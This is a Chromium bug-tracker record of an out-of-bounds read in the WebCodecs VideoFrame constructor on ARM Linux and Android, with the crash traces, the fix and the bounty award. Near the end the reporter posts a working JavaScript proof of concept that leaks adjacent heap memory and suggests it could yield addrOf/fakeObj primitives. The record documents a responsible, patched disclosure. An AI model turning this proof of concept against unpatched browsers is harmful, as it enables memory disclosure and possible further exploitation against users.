# WebCodecs VideoFrame constructor crashes browser when non-even width and height are used

| Field | Value |
|-------|-------|
| **Issue ID** | [441917796](https://issues.chromium.org/issues/441917796) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Media>WebCodecs |
| **Platforms** | Android, Linux, ChromeOS |
| **Chrome Version** | 138.0.7204.100 |
| **CVE IDs** | CVE-2025-11211 |
| **Reporter** | ko...@gmail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2025-08-29 |
| **Bounty** | $3,000.00 |

## Description

# Steps to reproduce the problem

Constructing a VideoFrame from array buffer source with non-even width and height crashes the browser. If only one of width and height is non-even it works. Happens only on non-gpu accelerated ARM linux, e.g. AWS Graviton.

This code:

const width = 1139;
const height = 641;
const buffer = new Uint8Array(2*width*height + 2 \* (Math.ceil(width / 2) \* Math.ceil(height / 2)));
const i420aFrame = new VideoFrame(buffer, {
format: 'I420A',
codedWidth: width,
codedHeight: height,
displayWidth: width,
displayHeight: height,
timestamp: 0,
});

Potentially reproducible when running Chrome without GPU accelerated video decode on arm linux. Easiest to reproduce with puppeteer on arm linux, try opening this page: <https://cache-ssl.celtra.io/api/blobs/3cf5aa9adedb3b14054869474264e73c004c1bbd472aa8ce052abd76fddbaf8a/reproduction.html>. It's the JS code from above, hosted on https so that WebCodecs API is available.

Puppeteer script for reproduction: <https://gist.github.com/jkosir/3134cbe9c95df268ebbcda3c9475f03b> . Must be run on arm linux, also note that puppeteer install does not support arm linux and chrome binary must be installed with system package manager or obtained in other way.

# Problem Description

Constructing a VideoFrame from array buffer source with non-even width and height crashes the browser. If only one of width and height is non-even it works. Happens only on non-gpu accelerated ARM linux, e.g. AWS Graviton. Works as expected in 134.0.6998.165 (and some alter versions, was not able to bisect), reproducible in 138.0.7204.100 and above stable versions.

Stacktrace on crash:
Received signal 11 SEGV\_ACCERR fbec001c2000
#0 0xbc3885f311e8 base::debug::CollectStackTrace()
#1 0xbc3885f20bc0 base::debug::StackTrace::StackTrace()
#2 0xbc3885f31094 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0xfd2981cfc8f8 ([vdso]+0x8f7)
#4 0xbc38868bf3bc CopyRow\_NEON
#5 0xbc38868a41b0 CopyRow\_Any\_NEON
#6 0xbc388689e8a0 CopyPlane
#7 0xbc388987d778 blink::VideoFrame::Create()
#8 0xbc38892bab8c blink::(anonymous namespace)::v8\_video\_frame::ConstructorOverload2()
#9 0xbc38839d01ac v8::internal::FunctionCallbackArguments::CallOrConstruct()
#10 0xbc38839cfcb0 v8::internal::(anonymous namespace)::HandleApiCallHelper<>()
#11 0xbc38839cf5fc v8::internal::Builtin\_HandleApiConstruct()
#12 0xbc38f7eb30e4 <unknown>
[end of stack trace]

I suspect it has something to do with this change in video\_frame.cc: <https://github.com/chromium/chromium/commit/a4a5b472dbe783f4a668916c28d0aa6c56680ce9>.
Tried building chromium with older libyuv (that implements the NEON copy) version, as used in 134.0.6998.165, same issue persists.

# Summary

WebCodecs VideoFrame constructor crashes browser when non-even width and height are used

# Additional Data

Category: JavaScript   

Chrome Channel: Stable   

Regression: Yes \

## Timeline

### an...@google.com (2025-08-29)

Hi test team, this appears to be a regression, making it a good candidate for bisection to quickly identify the root cause.
Please remove 'Needs-Bisect' hotlist and provide a rationale if bisection isn't applicable; this feedback will improve the automated system.

### da...@chromium.org (2025-08-29)

Thanks for the report! I can reproduce on Chrome Android too, crash/89ac83fb589d4a71 so marking this as a vulnerability.

### da...@chromium.org (2025-08-29)

Doesn't seem to crash macOS ARM though. I don't have a Chromebook to test right now

### da...@chromium.org (2025-08-29)

```
Thread 10 CrRendererMain (id: 0x00000917) *crashed* MAGIC SIGNATURE THREAD
0x0000007b5bcf57d8(libmonochrome_64.so -row_neon64.cc:1824)CopyRow_NEON
0x0000007b5bce2884(libmonochrome_64.so -row_any.cc:995)CopyRow_Any_NEON
0x0000007b5bcdd014(libmonochrome_64.so -planar_functions.cc:93)CopyPlane
0x0000007b61298974(libmonochrome_64.so -video_frame.cc:1050)blink::VideoFrame::Create(blink::ScriptState*, blink::V8UnionArrayBufferAllowSharedOrArrayBufferViewAllowShared const*, blink::VideoFrameBufferInit const*, blink::ExceptionState&)
0x0000007b61093ec8(libmonochrome_64.so -v8_video_frame.cc:371)blink::(anonymous namespace)::v8_video_frame::ConstructorOverload2(v8::FunctionCallbackInfo<v8::Value> const&)

```

### da...@chromium.org (2025-08-29)

I'd guess this is a bug in CopyRow\_NEON but will construct a unit test to see if that's true.

@fb...@chromium.org @wt...@google.com in case they're aware of any issues here.

### da...@chromium.org (2025-08-29)

Looks like it's crashing on copying the alpha plane:

```
i=0, src_stride=1139, dest_stride=1152, width=1140, height=642, src_offset=0, src_plane_size=730099, dest_offset=0, dest_plane_size=774144
i=1, src_stride=570, dest_stride=576, width=570, height=321, src_offset=730099, src_plane_size=182970, dest_offset=774144, dest_plane_size=202752
i=2, src_stride=570, dest_stride=576, width=570, height=321, src_offset=913069, src_plane_size=182970, dest_offset=976896, dest_plane_size=202752
i=3, src_stride=1139, dest_stride=1152, width=1140, height=642, src_offset=1096039, src_plane_size=730099, dest_offset=1179648, dest_plane_size=774736

```

### da...@chromium.org (2025-08-29)

Actually the error looks it might be in our code. We're setting width/height based on the destination frame (which rounded up) when we probably need to use the src frame width, height. See src\_stride=1139 but width=1140

### da...@chromium.org (2025-08-29)

Looks vp8 decoding might be affected by a similar issue:

- <https://source.chromium.org/chromium/chromium/src/+/main:media/filters/vpx_video_decoder.cc;l=623;drc=1c1b27ec1b83353b13645a8fef53ca6d832ecf49>

### da...@chromium.org (2025-08-29)

For security assessment: this is an OOB read in the renderer process.

### dx...@google.com (2025-08-30)

Project: chromium/src  

Branch:  main  

Author:  Dale Curtis [dalecurtis@chromium.org](mailto:dalecurtis@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6900663>

Use input visible size when calling CopyPlane()

---


Expand for full commit details
```
     
    The output coded size may be adjusted which causes the row_bytes() 
    and rows() methods on VideoFrame to return values which may be 
    outside the range of source. 
     
    Fixed: 441917796 
    Change-Id: I8bb6c7e70060717b9b28688a6424e0b032fb99ce 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6900663 
    Commit-Queue: Eugene Zemtsov <eugene@chromium.org> 
    Reviewed-by: Eugene Zemtsov <eugene@chromium.org> 
    Auto-Submit: Dale Curtis <dalecurtis@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1508722}

```

---

Files:

- M `media/base/video_frame.cc`
- M `media/base/video_frame.h`
- M `media/base/video_frame_unittest.cc`
- M `media/filters/vpx_video_decoder.cc`
- M `media/test/pipeline_integration_test.cc`
- M `third_party/blink/renderer/modules/webcodecs/video_frame.cc`
- M `third_party/blink/renderer/modules/webcodecs/video_frame_test.cc`

---

Hash: [dd13b8a2ae1d7a883958aecd964b90fae0fec263](https://chromiumdash.appspot.com/commit/dd13b8a2ae1d7a883958aecd964b90fae0fec263)  

Date: Sat Aug 30 03:13:53 2025


---

### ch...@google.com (2025-08-30)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### da...@chromium.org (2025-09-02)

S2 is correct for OOB read in renderer process

### ch...@google.com (2025-09-03)

Setting milestone because of s2 severity.

### sp...@google.com (2025-09-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
baseline user information disclosure (data READ) with a bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ko...@gmail.com (2025-09-12)

Thanks!

I just realised I made a public bug report initially, sorry about that. With a bit of a delay also attaching a OOB read demonstration below.

`addrOf/fakeObj` primitives can be implemented upon it, unfortunately I'm not familiar enough with v8 sandbox and other security features to determine if it can be used for arbitrary read/write or even RCE.

```
const width = 73;
const height = 89;
const minimalSize = 2 * width * height + 2 * (Math.ceil(width / 2) * Math.ceil(height / 2)) // 16324
const roundedUpSize = 2 * 74 * 90 + 2 * (37 * 45) // 16650

// On aarch64 ArrayBuffer backing_stores get allocated at page starts, page size is 16 KiB (16384 bytes)
// E.g. buffer1 backing_store allocated at 0xfec000004000 and buffer2 at 0xfec000008000.
// copyTo() will read the rounded/padded size of the frame (even coded size dimensions, codedSize=74*90), 
// even if source frame dimensions are odd and source buffer is compressed to minimum, ie. codedSize = 73x89.
// 16650 bytes will be copied from buffer1 backing_store, which also covers the start of buffer2 backing_store.
const buffer1 = new Uint8Array(2 * width * height + 2 * (Math.ceil(width / 2) * Math.ceil(height / 2)));
const buffer2 = new ArrayBuffer(360);
// Add some values to buffer2
for (let i = 0; i < 20; i++) {
    new Uint8Array(buffer2)[i] = 0x41 + i;
}

const i420aFrame = new VideoFrame(buffer1, {
    format: 'I420A',
    codedWidth: width,
    codedHeight: height,
    displayWidth: width,
    displayHeight: height,
    timestamp: 0,
});
const buffer3 = new Uint8Array(roundedUpSize);
copy();

async function copy() {
    await i420aFrame.copyTo(buffer3, { rect: i420aFrame.codedRect });
    console.log(new Uint8Array(buffer3.slice(16636)));
    // -> Uint8Array(14) {0: 65, 1: 66, 2: 67, 3: 68, 4: 69, 5: 70, 6: 71, 7: 72, 8: 73, 9: 74, 10: 75, 11: 76, 12: 77, 13: 78, buffer: ArrayBuffer(14), byteLength: 14, byteOffset: 0, length: 14, Symbol(Symbol.toStringTag): "Uint8Array"}
}

```

### bo...@chromium.org (2025-10-09)

Hey y'all, are we confident the CVE number is assigned correctly? It looks like [another bug](https://issues.chromium.org/issues/420734141) was assigned CVE-2025-11211, but the bugs don't look similar to me.

### ch...@google.com (2025-12-10)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> baseline user information disclosure (data READ) with a bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/441917796)*
